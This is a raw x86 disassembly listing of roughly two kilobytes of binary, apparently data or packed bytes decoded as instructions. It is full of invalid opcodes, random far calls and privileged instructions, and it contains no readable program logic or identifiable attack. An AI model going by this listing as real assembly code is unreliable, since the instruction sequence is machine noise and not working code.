  4056f6:	mov    edi,0xfa53a7ac
  4056fb:	mov    ds:0x582c5222,al
  405700:	adc    eax,0x4bee6e40
  405705:	inc    ecx
  405706:	js     0x40570c
  405708:	jnp    0x405744
  40570a:	add    BYTE PTR [eax],al
  40570c:	add    BYTE PTR [eax],al
  40570e:	add    BYTE PTR [ecx+ecx*8+0x2ed23b45],cl
  405715:	jno    0x405730
  405717:	adc    BYTE PTR [ebp+0x7b6e1828],dl
  40571d:	pop    ds
  40571e:	sbb    eax,0x149a71ab
  405723:	fld    DWORD PTR [esi+0x5b9600ad]
  405729:	fwait
  40572a:	cli    
  40572b:	xchg   DWORD PTR [edi-0x415f320f],eax
  405731:	push   ebx
  405732:	pusha  
  405733:	mov    eax,ds:0x5357397c
  405738:	cmp    al,BYTE PTR [edi-0x1407adf2]
  40573e:	cmp    DWORD PTR [edi],ebx
  405740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405741:	sti    
  405742:	mov    esp,0x8b91632e
  405747:	sub    al,0x41
  405749:	das    
  40574a:	shr    BYTE PTR ds:0x26e543ff,cl
  405750:	stos   DWORD PTR es:[edi],eax
  405751:	add    bl,al
  405753:	daa    
  405754:	ins    DWORD PTR es:[edi],dx
  405755:	push   0xd626f5ef
  40575a:	mov    dh,0xe4
  40575c:	call   0x9429d91f
  405761:	stos   BYTE PTR es:[edi],al
  405762:	add    al,0xd8
  405764:	push   ebp
  405765:	shl    BYTE PTR [ebx],0xfa
  405768:	das    
  405769:	jle    0x4057d5
  40576b:	sub    esi,edx
  40576d:	push   ss
  40576e:	pop    ebp
  40576f:	xor    al,0x98
  405771:	lock adc BYTE PTR [eax],al
  405774:	add    BYTE PTR [eax],al
  405776:	add    BYTE PTR [eax],al
  405778:	xor    eax,0xa7279a5a
  40577d:	sbb    esp,DWORD PTR [esi+edi*2]
  405780:	mov    dh,0xdd
  405782:	xor    BYTE PTR [ecx-0x45],cl
  405785:	sahf   
  405786:	pop    eax
  405787:	int3   
  405788:	stos   BYTE PTR es:[edi],al
  405789:	pusha  
  40578a:	xor    bh,bl
  40578c:	test   al,0x2
  40578e:	mov    WORD PTR [edx-0x6a173b87],fs
  405794:	jb     0x40571e
  405796:	mov    eax,ds:0xcb4673a8
  40579b:	lahf   
  40579c:	or     DWORD PTR [esi*2+0x1dca60c6],0x319790f1
  4057a7:	pop    es
  4057a8:	and    al,0xae
  4057aa:	jae    0x405819
  4057ac:	push   ebx
  4057ad:	mov    ch,cl
  4057af:	shr    DWORD PTR [edx-0x4a46f05f],cl
  4057b5:	push   0x5a
  4057b7:	xchg   esi,eax
  4057b8:	shr    BYTE PTR [ebx+0x18],1
  4057bb:	cld    
  4057bc:	dec    DWORD PTR [ebp+0x21]
  4057bf:	inc    edx
  4057c0:	mov    esi,0x8928634c
  4057c5:	push   ecx
  4057c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c7:	ds cld 
  4057c9:	inc    edi
  4057ca:	out    0x53,al
  4057cc:	sub    ebp,DWORD PTR [esi+0x28]
  4057cf:	jmp    0x684d:0x806a6742
  4057d6:	into   
  4057d7:	(bad)  
  4057d8:	cmp    BYTE PTR [ecx+0xad0c],al
  4057de:	add    BYTE PTR [eax],al
  4057e0:	add    BYTE PTR [edi+0x37],al
  4057e3:	xor    dl,BYTE PTR [ebx]
  4057e5:	push   es
  4057e6:	dec    esi
  4057e7:	jo     0x405862
  4057e9:	icebp  
  4057ea:	inc    edx
  4057eb:	mov    bh,0x6f
  4057ed:	je     0x405831
  4057ef:	cmc    
  4057f0:	add    al,0x83
  4057f2:	push   esp
  4057f3:	cmp    edi,DWORD PTR [ebx-0x2e86aaa6]
  4057f9:	test   DWORD PTR [esi-0x7d],edx
  4057fc:	xor    eax,0x5ec16fc0
  405801:	(bad)
  405805:	dec    esi
  405806:	pusha  
  405807:	pop    ebp
  405808:	mov    edi,DWORD PTR [ecx+0x55]
  40580b:	mov    bl,BYTE PTR [ebp-0x937ac14]
  405811:	mov    ebx,0x12490641
  405816:	inc    ebx
  405817:	inc    esp
  405818:	and    edi,ebp
  40581a:	pop    ebx
  40581b:	nop
  40581c:	or     BYTE PTR fs:[ebp-0x2e],bl
  405820:	or     eax,0x2267b1f7
  405825:	loopne 0x4057fe
  405827:	gs pusha 
  405829:	retf   0x62e2
  40582c:	xchg   edi,eax
  40582d:	int3   
  40582e:	gs push 0xffffffd5
  405831:	in     eax,dx
  405832:	push   esp
  405833:	pusha  
  405834:	sbb    ebp,DWORD PTR [eax+0x259698c]
  40583a:	mov    esi,0x1360664e
  40583f:	dec    edi
  405840:	and    al,0x3a
  405842:	sub    BYTE PTR [ebp+0xe9],bl
  405848:	add    BYTE PTR [eax],al
  40584a:	xchg   ebx,eax
  40584b:	add    BYTE PTR [edi+eiz*4+0x6e88c9f6],bl
  405852:	fmul   DWORD PTR [esi+0x70]
  405855:	sub    al,0x82
  405857:	jnp    0x4057f3
  405859:	repnz sti 
  40585b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40585c:	xor    DWORD PTR [eax+0x7480964e],0x11
  405863:	stos   DWORD PTR es:[edi],eax
  405864:	mov    DWORD PTR [esi],esi
  405866:	sub    esp,DWORD PTR [eax+0x48c4f843]
  40586c:	dec    edx
  40586d:	mov    edx,0x7b477167
  405872:	imul   esi,esi,0xc3d33d45
  405878:	inc    ebx
  405879:	dec    DWORD PTR [ebx*1+0x2e1fc145]
  405880:	xor    al,BYTE PTR [edi-0x7d]
  405883:	loop   0x4058bf
  405885:	or     DWORD PTR [ecx+0x36c390d7],ebx
  40588b:	adc    DWORD PTR [eax-0x6ac62a7b],ebx
  405891:	push   eax
  405892:	mov    ebx,0x211294be
  405897:	mov    WORD PTR [esi-0x34],?
  40589a:	sahf   
  40589b:	push   esp
  40589c:	ja     0x40582c
  40589e:	sub    eax,0x5a720e65
  4058a3:	xchg   esp,eax
  4058a4:	data16 jae 0x40583f
  4058a7:	jp     0x4058fa
  4058a9:	popa   
  4058aa:	mov    ch,0x7
  4058ad:	pusha  
  4058ae:	add    BYTE PTR [eax],al
  4058b0:	add    BYTE PTR [eax],al
  4058b2:	add    ah,bh
  4058b4:	cs aas 
  4058b6:	push   ebp
  4058b7:	xor    DWORD PTR [edx+edi*4],edi
  4058ba:	dec    esp
  4058bb:	ja     0x40588f
  4058bd:	mov    WORD PTR [esi+0x6d],es
  4058c0:	ins    DWORD PTR es:[edi],dx
  4058c1:	aam    0x3f
  4058c3:	sub    eax,DWORD PTR [esi-0x4d6c161d]
  4058c9:	push   cs
  4058ca:	xor    DWORD PTR [edi],esi
  4058cc:	push   edi
  4058cd:	imul   edx,DWORD PTR [ebx-0x47b0565],0x1e
  4058d4:	pop    ds
  4058d5:	loopne 0x40593d
  4058d7:	jbe    0x405901
  4058d9:	pop    ecx
  4058da:	push   ss
  4058db:	bnd ret 0xc3b
  4058df:	cmp    eax,0xe95cd270
  4058e4:	mov    dh,BYTE PTR [edi-0x1e660754]
  4058ea:	sub    al,0x84
  4058ec:	jg     0x405872
  4058ee:	push   ss
  4058ef:	out    dx,eax
  4058f0:	shr    DWORD PTR [ecx-0x4a],1
  4058f3:	xchg   ebx,eax
  4058f4:	aaa    
  4058f5:	mov    db7,edx
  4058f8:	movzx  ebx,BYTE PTR [ebx-0x762d18da]
  4058ff:	jno    0x405948
  405901:	cmp    eax,0x58beed21
  405906:	sbb    DWORD PTR [ebx+0x2f819167],ebx
  40590c:	xor    ah,0x63
  40590f:	test   BYTE PTR [edi],ch
  405911:	sbb    ch,BYTE PTR [ebx+0x367eca37]
  405917:	add    BYTE PTR [eax],al
  405919:	add    BYTE PTR [eax],al
  40591b:	add    ch,bl
  40591d:	push   cs
  40591e:	mov    dh,0x48
  405921:	pop    ss
  405922:	mov    ds:0x8c50c00,eax
  405927:	inc    ebx
  405928:	je     0x40598e
  40592a:	popa   
  40592b:	es pop esp
  40592d:	pop    ds
  40592e:	jno    0x4059a0
  405930:	mov    ah,0xa3
  405932:	push   ss
  405933:	adc    eax,0xfbb916b6
  405938:	cs scas al,BYTE PTR es:[edi]
  40593a:	ficomp WORD PTR [esi+0x27e661a3]
  405940:	dec    ebx
  405941:	lds    edi,FWORD PTR [edi+0x42]
  405944:	leave  
  405945:	js     0x405975
  405947:	lods   al,BYTE PTR ds:[esi]
  405948:	adc    eax,0x84c9c947
  40594e:	mov    eax,ds:0xc624613e
  405953:	pop    ebx
  405954:	arpl   WORD PTR [edi+0x3b0bb569],cx
  40595a:	push   cs
  40595b:	rcl    BYTE PTR [esi-0x2196c71a],1
  405961:	pop    ebp
  405962:	push   ecx
  405963:	or     al,0xbc
  405965:	call   0x55853c4a
  40596a:	cdq    
  40596b:	xchg   esp,ecx
  40596d:	cmp    BYTE PTR [ecx-0x116ffb2f],cl
  405973:	mov    ah,0xe6
  405975:	and    al,BYTE PTR [ecx+0x5a]
  405978:	jle    0x405901
  40597a:	es aas 
  40597c:	adc    edx,DWORD PTR [esi+0x1e]
  40597f:	xchg   BYTE PTR [eax],al
  405981:	add    BYTE PTR [eax],al
  405983:	add    BYTE PTR [eax],al
  405985:	pop    ebx
  405986:	out    dx,al
  405987:	ja     0x40596c
  405989:	mov    ecx,0x110dd65d
  40598e:	loope  0x40593f
  405990:	push   0xa1f69e79
  405995:	mov    cl,0x2b
  405997:	xchg   ecx,eax
  405998:	(bad)  
  405999:	rcl    DWORD PTR [edi+0x135b2a3e],cl
  40599f:	pop    ecx
  4059a0:	dec    edi
  4059a1:	nop
  4059a2:	in     al,0xc3
  4059a4:	outs   dx,BYTE PTR ds:[esi]
  4059a5:	ficom  WORD PTR [eax+edi*2-0x3250dcf8]
  4059ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ad:	inc    ebp
  4059ae:	(bad)  
  4059af:	jo     0x405971
  4059b1:	cwde   
  4059b2:	into   
  4059b3:	lods   eax,DWORD PTR ds:[esi]
  4059b4:	rol    BYTE PTR [esi+0x6e],1
  4059b7:	sub    dh,BYTE PTR [edi+0x1897347b]
  4059bd:	int    0xf4
  4059bf:	and    bh,BYTE PTR [edi-0x10]
  4059c2:	popa   
  4059c3:	jo     0x405a0c
  4059c5:	jns    0x4059a0
  4059c7:	retf   
  4059c8:	pop    ds
  4059c9:	or     al,0xec
  4059cb:	js     0x40595c
  4059cd:	and    ah,BYTE PTR [ebx-0x3b]
  4059d0:	out    0x87,eax
  4059d2:	pusha  
  4059d3:	sbb    DWORD PTR [eax-0x4b],ebx
  4059d6:	clc    
  4059d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d8:	aas    
  4059d9:	enter  0x2faa,0x90
  4059dd:	push   ds
  4059de:	inc    edx
  4059df:	stos   DWORD PTR es:[edi],eax
  4059e0:	test   DWORD PTR [ebx-0x31],0x4feacefa
  4059e7:	inc    esp
  4059e8:	test   al,0x0
  4059ea:	add    BYTE PTR [eax],al
  4059ec:	add    BYTE PTR [eax],al
  4059ee:	lahf   
  4059ef:	xor    eax,0xd53106f1
  4059f4:	dec    ebx
  4059f5:	pusha  
  4059f6:	adc    al,0xa5
  4059f8:	stos   BYTE PTR es:[edi],al
  4059f9:	jo     0x405a5d
  4059fb:	cmc    
  4059fc:	sub    eax,0xa32ee717
  405a01:	mov    eax,0xdf179fc9
  405a06:	pop    esp
  405a07:	or     cl,BYTE PTR [edi+eiz*8+0xd]
  405a0b:	mov    dl,0xf0
  405a0d:	jg     0x4059ff
  405a0f:	scas   eax,DWORD PTR es:[edi]
  405a10:	inc    ebp
  405a11:	das    
  405a12:	xchg   esi,eax
  405a13:	sbb    cl,bh
  405a15:	inc    edi
  405a16:	imul   edx,DWORD PTR [eax],0x1f
  405a19:	rdmsr  
  405a1b:	enter  0x68b9,0xd7
  405a1f:	mov    cl,0xc6
  405a21:	pop    es
  405a22:	iret   
  405a23:	call   0xeea3:0x7e30bc4e
  405a2a:	inc    esi
  405a2c:	inc    edx
  405a2d:	push   ebx
  405a2e:	iret   
  405a2f:	and    DWORD PTR [ecx-0x1a],ebx
  405a32:	push   edi
  405a33:	dec    esp
  405a34:	cdq    
  405a35:	pop    ecx
  405a36:	xchg   DWORD PTR [ecx+0x7f6fbce9],ebp
  405a3c:	jns    0x405a47
  405a3e:	push   eax
  405a3f:	call   0xff2:0xf3b7b443
  405a46:	or     BYTE PTR [ecx],dl
  405a48:	pop    bx
  405a4a:	loopne 0x4059f3
  405a4c:	fsubrp st(6),st
  405a4e:	dec    sp
  405a50:	fcom   QWORD PTR [ecx+0x0]
  405a53:	add    BYTE PTR [eax],al
  405a55:	add    BYTE PTR [eax],al
  405a57:	or     BYTE PTR [edx],ah
  405a59:	push   esp
  405a5a:	out    dx,al
  405a5b:	sahf   
  405a5c:	(bad)  
  405a5d:	mov    ebx,0x64b07f25
  405a62:	call   0x3aa7:0x2e765500
  405a69:	push   ds
  405a6a:	xchg   ebx,eax
  405a6b:	mov    eax,0xb7c792dd
  405a70:	sar    WORD PTR [ebx-0x69],cl
  405a74:	sub    ecx,0x88ebefd0
  405a7a:	je     0x405acb
  405a7c:	or     DWORD PTR [ecx+0x28df5791],edi
  405a82:	cs call 0x7fdb8dc1
  405a88:	push   ebx
  405a89:	and    DWORD PTR [esi],0xffffffa0
  405a8c:	mov    al,0x16
  405a8e:	je     0x405a58
  405a90:	pop    es
  405a91:	scas   al,BYTE PTR es:[edi]
  405a92:	iret   
  405a93:	mov    esi,0x107cabec
  405a98:	add    DWORD PTR [ecx+ecx*8],0xfffffff6
  405a9c:	gs push cs
  405a9e:	add    dh,BYTE PTR [edi+0x129a9212]
  405aa4:	hlt    
  405aa5:	imul   BYTE PTR [eax]
  405aa7:	popf   
  405aa8:	pop    edx
  405aa9:	sbb    eax,esp
  405aab:	or     DWORD PTR [esp+edi*2-0x3a7b0fb3],edi
  405ab2:	lods   eax,DWORD PTR ds:[esi]
  405ab3:	xor    al,0x62
  405ab5:	mov    al,ds:0x4dccdfb7
  405aba:	aaa    
  405abb:	add    BYTE PTR [eax],al
  405abd:	add    BYTE PTR [eax],al
  405abf:	add    BYTE PTR [ebx],ch
  405ac1:	sub    ch,BYTE PTR [ebx]
  405ac3:	xchg   DWORD PTR [edx],ecx
  405ac5:	cmp    edi,DWORD PTR [ebp-0x29]
  405ac8:	data16 fist DWORD PTR [edi]
  405acb:	in     eax,dx
  405acc:	adc    DWORD PTR [ebx-0xa],esi
  405acf:	pop    ebp
  405ad0:	pop    ebp
  405ad1:	xchg   ebx,eax
  405ad2:	xchg   ebx,eax
  405ad3:	enter  0xab24,0x2a
  405ad7:	jo     0x405b41
  405ad9:	inc    ebx
  405ada:	dec    edi
  405adb:	jb     0x405ad0
  405add:	jecxz  0x405a7f
  405adf:	mov    edx,0x4c41b5f
  405ae4:	push   esp
  405ae5:	add    eax,0xe1f89435
  405aea:	dec    edi
  405aeb:	cs cmp al,0x4d
  405aee:	mov    esi,0xdba9e0de
  405af3:	dec    ebx
  405af4:	cdq    
  405af5:	xchg   ecx,eax
  405af6:	bound  esi,QWORD PTR [ebx-0x4ef88beb]
  405afc:	sbb    cl,0xe8
  405aff:	cmp    DWORD PTR [esi],ecx
  405b01:	cmp    al,0x8c
  405b03:	add    DWORD PTR [edi+0x4359da2c],esp
  405b09:	retf   0x6bbe
  405b0c:	mov    eax,0x3be35164
  405b11:	xor    BYTE PTR [esi+ecx*2],0x5
  405b15:	mov    ecx,0x5cc0ee8d
  405b1a:	call   0xcf75571f
  405b1f:	or     ah,al
  405b21:	mov    BYTE PTR [eax+0x6d],ch
  405b27:	add    BYTE PTR [eax],al
  405b29:	mov    esp,0xf4a4edf6
  405b2e:	dec    edx
  405b2f:	mov    cl,al
  405b31:	out    0xf7,al
  405b33:	and    eax,0x40430e2f
  405b38:	dec    edx
  405b39:	jnp    0x405acb
  405b3b:	js     0x405b30
  405b3d:	xor    ebp,DWORD PTR [edi+ebx*1]
  405b40:	xchg   esi,eax
  405b41:	xor    DWORD PTR [ecx+0x258978b0],ebx
  405b47:	xlat   BYTE PTR ds:[ebx]
  405b48:	sbb    eax,0x4bc74301
  405b4d:	jns    0x405b4d
  405b4f:	mov    ds:0xf4b6b2e,al
  405b54:	rol    BYTE PTR [ebx],0xf0
  405b57:	push   0xffffffa5
  405b59:	jbe    0x405b7f
  405b5b:	push   eax
  405b5c:	sbb    al,0x2e
  405b5e:	pushf  
  405b5f:	aaa    
  405b60:	jns    0x405b8e
  405b62:	daa    
  405b63:	cwde   
  405b64:	xchg   edi,eax
  405b65:	xchg   esp,eax
  405b66:	xchg   ebx,eax
  405b67:	push   edx
  405b69:	sub    al,0xdb
  405b6b:	adc    eax,0x705f6405
  405b70:	pusha  
  405b71:	push   esi
  405b72:	aam    0xdd
  405b74:	mov    ds,WORD PTR [esi+0x2bebb868]
  405b7a:	mov    ebp,0x1e35280
  405b7f:	out    0x37,eax
  405b81:	loope  0x405b31
  405b83:	dec    eax
  405b84:	fstp   DWORD PTR [ecx]
  405b86:	or     ch,BYTE PTR [edi]
  405b88:	mov    esp,0xea3f66b1
  405b8d:	add    BYTE PTR [eax],al
  405b8f:	add    BYTE PTR [eax],al
  405b91:	add    BYTE PTR [ecx],ch
  405b93:	rcr    DWORD PTR [edx-0x71],cl
  405b96:	pop    ebx
  405b97:	pusha  
  405b98:	mul    DWORD PTR [ecx+0x13]
  405b9b:	fcom   QWORD PTR [edx-0x50276ffc]
  405ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ba2:	dec    ebp
  405ba3:	jns    0x405bb1
  405ba5:	shr    eax,0x5e
  405ba8:	mov    ecx,0x4dec66e
  405bad:	or     DWORD PTR [ebx-0x22],esp
  405bb0:	dec    BYTE PTR [ebp+0xa]
  405bb3:	outs   dx,DWORD PTR ds:[esi]
  405bb4:	inc    ebx
  405bb5:	sub    edi,esp
  405bb7:	sub    dh,dh
  405bb9:	test   DWORD PTR [ecx+0x5ce149d8],eax
  405bbf:	dec    ebp
  405bc0:	sbb    eax,0xbeb5ddd9
  405bc5:	mov    esi,0x1115b3f8
  405bca:	push   esi
  405bcb:	pop    ebx
  405bcc:	test   al,0x76
  405bce:	jae    0x405b73
  405bd0:	dec    ebx
  405bd1:	and    ax,0xf6fb
  405bd5:	add    BYTE PTR [eax-0x6151bdd3],al
  405bdb:	test   esi,edi
  405bdd:	enter  0x8fb,0xa9
  405be1:	icebp  
  405be2:	mov    dl,0xc8
  405be4:	adc    edx,DWORD PTR [esi+0x39a0aecf]
  405bea:	sub    DWORD PTR [esi],ecx
  405bec:	sbb    al,0x5e
  405bee:	inc    esp
  405bef:	dec    ecx
  405bf0:	shr    ch,0x96
  405bf3:	test   eax,0x897c
  405bf8:	add    BYTE PTR [eax],al
  405bfa:	add    bl,dh
  405bfc:	out    dx,eax
  405bfd:	int    0x25
  405bff:	or     eax,0x6841726f
  405c04:	loop   0x405c2a
  405c06:	jns    0x405be9
  405c08:	call   0xb12c:0xac7c1e99
  405c0f:	pop    edx
  405c10:	in     al,0x8f
  405c12:	(bad)  
  405c13:	test   DWORD PTR [ebx+0x73],0xcdd439c6
  405c1a:	mov    al,ds:0x740eb214
  405c1f:	mov    ss,WORD PTR [esi+eax*2-0x38]
  405c23:	test   al,0xb1
  405c25:	fistp  DWORD PTR [esi+0x236b0861]
  405c2b:	mov    esi,0x199650ed
  405c30:	jg     0x405bf3
  405c32:	sub    esi,esi
  405c34:	popa   
  405c35:	ror    edi,0x28
  405c38:	sub    eax,DWORD PTR [ecx+0x6c]
  405c3b:	mov    ch,0x7a
  405c3e:	fldenv [eax-0x5c]
  405c41:	sbb    esp,DWORD PTR [ebp+0x7e]
  405c44:	inc    ecx
  405c45:	mov    ?,WORD PTR [edx]
  405c47:	jle    0x405c41
  405c49:	cmc    
  405c4a:	lea    ebx,[ecx+0x1d]
  405c4d:	in     al,0x3a
  405c4f:	mov    dh,0x6e
  405c51:	mov    WORD PTR [edi+0x64449211],es
  405c57:	add    DWORD PTR [eax-0x64],eax
  405c5a:	xlat   BYTE PTR ds:[ebx]
  405c5b:	popf   
  405c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c5d:	mov    esi,0x6c
  405c62:	add    BYTE PTR [eax],al
  405c64:	cmp    edi,eax
  405c66:	adc    eax,0x8b2a55d1
  405c6b:	test   DWORD PTR [esi-0xec5c46f],edx
  405c71:	outs   dx,BYTE PTR ds:[esi]
  405c72:	and    DWORD PTR [edi+0x32711d4e],ecx
  405c78:	sub    eax,edi
  405c7a:	adc    bl,bh
  405c7c:	ror    BYTE PTR [edx+0x65ae4671],1
  405c82:	imul   esi,edx,0x8
  405c85:	add    al,0xab
  405c87:	dec    ebp
  405c88:	data16 loope 0x405cc8
  405c8b:	sbb    DWORD PTR [esi+0x58],esp
  405c8e:	(bad)  
  405c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c90:	add    DWORD PTR [ebp-0x3161f04c],edi
  405c96:	cmp    ebp,DWORD PTR [ecx+edi*4-0x2125f1cf]
  405c9d:	pop    ecx
  405c9e:	fld    DWORD PTR [edx+0x60bcb622]
  405ca4:	aad    0x11
  405ca6:	push   edx
  405ca7:	call   0x75774ac5
  405cac:	cmp    al,0xc9
  405cae:	(bad)  
  405caf:	lds    esp,FWORD PTR [eax+0x33bfeb29]
  405cb5:	add    DWORD PTR ds:0x60619f6f,0xa99df16f
  405cbf:	scas   eax,DWORD PTR es:[edi]
  405cc0:	inc    ebp
  405cc1:	inc    ecx
  405cc2:	int3   
  405cc3:	adc    eax,0x7521e5eb
  405cc8:	add    BYTE PTR [eax],al
  405cca:	add    BYTE PTR [eax],al
  405ccc:	add    BYTE PTR [esi],bh
  405cce:	or     DWORD PTR [edi-0x20],eax
  405cd1:	iret   
  405cd2:	xor    bh,dh
  405cd4:	cwde   
  405cd5:	or     edx,ecx
  405cd7:	call   0xfce2:0x7579888a
  405cde:	cwde   
  405cdf:	adc    BYTE PTR [edx+0x32468845],ch
  405ce5:	mov    ecx,0x3e10236a
  405cea:	ror    ah,0xb8
  405ced:	mov    dl,0x22
  405cef:	test   al,0x25
  405cf1:	inc    ebx
  405cf2:	sbb    DWORD PTR [ecx],edx
  405cf4:	xchg   ebp,eax
  405cf5:	(bad)  
  405cf6:	clc    
  405cf7:	jae    0x405c88
  405cf9:	cmp    al,0x51
  405cfb:	call   0x93ea:0xffb0901f
  405d02:	scas   al,BYTE PTR es:[edi]
  405d03:	push   cs
  405d04:	in     al,0x93
  405d06:	mov    al,0xe
  405d08:	out    dx,al
  405d09:	xchg   ebx,eax
  405d0a:	mov    edx,0xbc93f00e
  405d0f:	push   cs
  405d10:	loop   0x405ca5
  405d12:	mov    ch,0xe
  405d14:	ficom  WORD PTR [ebx+0x5a000ea1]
  405d1a:	mov    bl,0x19
  405d1c:	add    BYTE PTR [edx],dh
  405d1e:	mov    bl,0x11
  405d20:	add    BYTE PTR [edx+0x2a0025ae],bl
  405d26:	mov    bl,0x35
  405d28:	add    BYTE PTR [edx-0x52],ch
  405d2b:	pop    ebp
  405d2c:	add    BYTE PTR [edx+0x7dae],cl
  405d32:	add    BYTE PTR [eax],al
  405d34:	add    BYTE PTR [eax],al
  405d36:	jp     0x405ce6
  405d38:	lods   eax,DWORD PTR ds:[esi]
  405d39:	add    BYTE PTR [edx],bh
  405d3b:	scas   al,BYTE PTR es:[edi]
  405d3c:	in     eax,dx
  405d3d:	add    bl,ch
  405d3f:	mov    bl,0xe
  405d41:	add    cl,ch
  405d43:	mov    dl,0xe
  405d45:	add    cl,cl
  405d47:	mov    dl,0x1e
  405d49:	add    cl,cl
  405d4b:	mov    dl,0x1e
  405d4d:	add    cl,bl
  405d4f:	mov    dl,0x1e
  405d51:	add    cl,bl
  405d53:	mov    dl,0x1e
  405d55:	add    al,cl
  405d57:	mov    dl,0x1f
  405d59:	add    al,cl
  405d5b:	mov    dl,0x1f
  405d5d:	add    bl,bl
  405d5f:	mov    dl,0x1c
  405d61:	add    bl,bl
  405d63:	mov    dl,0x1c
  405d65:	add    dl,cl
  405d67:	mov    dl,0x1d
  405d69:	add    dl,cl
  405d6b:	mov    dl,0x1d
  405d6d:	add    BYTE PTR [ebp-0x62ffe54e],bl
  405d73:	mov    dl,0x1a
  405d75:	add    BYTE PTR [edx+esi*4-0x4d83ffe5],cl
  405d7c:	sbb    eax,DWORD PTR [eax]
  405d7e:	pop    ecx
  405d7f:	mov    dl,0xc5
  405d81:	add    BYTE PTR [edx+esi*4],ch
  405d84:	push   cs
  405d85:	add    BYTE PTR [eax-0x4e],bh
  405d88:	or     al,0x0
  405d8a:	jp     0x405d3e
  405d8c:	or     al,BYTE PTR [eax]
  405d8e:	ins    BYTE PTR es:[edi],dx
  405d8f:	mov    dl,0x9
  405d91:	add    BYTE PTR [eax-0x4e],ah
  405d94:	add    eax,DWORD PTR [eax]
  405d96:	nop
  405d97:	retf   0x190c
  405d9a:	add    BYTE PTR [eax],al
  405d9c:	add    BYTE PTR [eax],al
  405d9e:	add    BYTE PTR [eax-0x6fcef546],dl
  405da4:	call   0xc10d:0x5a90610a
  405dab:	nop
  405dac:	fimul  DWORD PTR [ebx]
  405dae:	adc    DWORD PTR [ecx-0x6cfef526],0x8e00f0da
  405db8:	fiadd  DWORD PTR [ecx+eax*1]
  405dbb:	pushf  
  405dbc:	ficomp DWORD PTR [ecx+eax*1]
  405dbf:	test   al,0xda
  405dc1:	sub    al,0x1
  405dc3:	rcr    dl,0xcc
  405dc6:	add    BYTE PTR [eax-0x25],dh
  405dc9:	or     al,0x0
  405dcb:	nop
  405dcc:	jmp    0x405dda
  405dce:	adc    BYTE PTR [eax-0x6feff315],dl
  405dd4:	retf   0x110c
  405dd7:	nop
  405dd8:	leave  
  405dd9:	or     al,0x12
  405ddb:	nop
  405ddc:	enter  0x130c,0x90
  405de0:	mov    edi,0xe690140c
  405de5:	or     al,0x15
  405de7:	nop
  405de8:	fisttp QWORD PTR [esi+edx*1]
  405deb:	nop
  405dec:	in     al,0xc
  405dee:	pop    ss
  405def:	nop
  405df0:	jecxz  0x405dfe
  405df2:	sbb    BYTE PTR [eax-0x6fe6f54e],dl
  405df8:	mov    cl,0xa
  405dfa:	sbb    dl,BYTE PTR [eax-0x6fe4f340]
  405e00:	xlat   BYTE PTR ds:[ebx]
  405e01:	or     al,0x1c
  405e03:	add    BYTE PTR [eax],al
  405e05:	add    BYTE PTR [eax],al
  405e07:	add    BYTE PTR [eax-0x6fe2f332],dl
  405e0d:	sbb    ecx,DWORD PTR ds:0xe7129040
  405e13:	jne    0x405e06
  405e15:	inc    edi
  405e16:	in     al,0x63
  405e18:	mov    al,0xb2
  405e1a:	push   edi
  405e1b:	in     eax,0xe1
  405e1d:	push   ebx
  405e1e:	inc    edx
  405e1f:	loope  0x405de4
  405e21:	dec    edi
  405e22:	push   ebp
  405e23:	and    al,0xc0
  405e25:	push   ebx
  405e26:	push   esp
  405e27:	repz mov ah,0x4e
  405e2a:	pop    es
  405e2b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e2d:	xchg   edx,eax
  405e2e:	and    al,0x24
  405e30:	mov    ds:0xb8f0493f,al
  405e35:	push   edi
  405e36:	dec    edx
  405e37:	and    al,0xb6
  405e39:	aas    
  405e3a:	sbb    ebx,esp
  405e3c:	mov    ds:0xbde6005b,eax
  405e41:	mov    eax,0xb29003e7
  405e46:	aaa    
  405e47:	ficom  WORD PTR [ebx-0x4e]
  405e4a:	inc    edi
  405e4b:	ficom  WORD PTR [ebx-0x4e]
  405e4e:	out    0x3,eax
  405e50:	nop
  405e51:	mov    dl,0xe1
  405e53:	adc    DWORD PTR [eax],0x2c
  405e56:	test   DWORD PTR [bx+si],edx
  405e59:	mov    dl,0xe7
  405e5b:	adc    edx,DWORD PTR [ebx+0x127e672c]
  405e61:	xor    dh,bl
  405e63:	add    BYTE PTR [ebp+0x14c0aa6f],cl
  405e69:	das    
  405e6a:	bound  eax,QWORD PTR [ecx]
  405e6c:	add    BYTE PTR [eax],al
  405e6e:	add    BYTE PTR [eax],al
  405e70:	add    BYTE PTR [eax+0x1033f7b2],dl
  405e76:	bound  esp,QWORD PTR [edi-0x7c]
  405e79:	nop
  405e7a:	mov    edx,0x8a772be7
  405e7f:	mov    bh,0xce
  405e81:	pop    ss
  405e82:	mov    dl,0xe8
  405e84:	add    eax,edi
  405e86:	adc    bh,0xd3
  405e89:	xlat   BYTE PTR ds:[ebx]
  405e8a:	cmp    ah,bh
  405e8c:	add    edx,DWORD PTR [eax+0x883df92]
  405e92:	xor    esp,DWORD PTR [edi+0x4]
  405e95:	nop
  405e96:	mov    dl,0xe
  405e98:	mov    DWORD PTR [ebx+0x64],esi
  405e9b:	sub    WORD PTR [ebx-0x54],0xee06
  405ea1:	pop    ebx
  405ea2:	push   esp
  405ea3:	jle    0x405efb
  405ea5:	inc    esp
  405ea6:	push   esp
  405ea7:	push   es
  405ea8:	loope  0x405e3d
  405eaa:	mov    dl,0x6
  405eac:	jmp    0xf14a113c
  405eb1:	xchg   ebx,eax
  405eb2:	mov    dl,0xe
  405eb4:	xor    eax,0x390e5594
  405eb9:	mov    WORD PTR [edx+0x3f94040e],?
  405ebf:	push   cs
  405ec0:	int3   
  405ec1:	xchg   ebx,eax
  405ec2:	or     BYTE PTR [esi],0xe1
  405ec5:	xchg   ebx,eax
  405ec6:	dec    edx
  405ec7:	push   cs
  405ec8:	(bad)  
  405ec9:	xchg   ebx,eax
  405eca:	lea    ecx,[esi]
  405ecc:	sbb    dl,BYTE PTR [edx+esi*4+0x3f93cc0e]
  405ed3:	push   cs
  405ed4:	les    eax,FWORD PTR [eax]
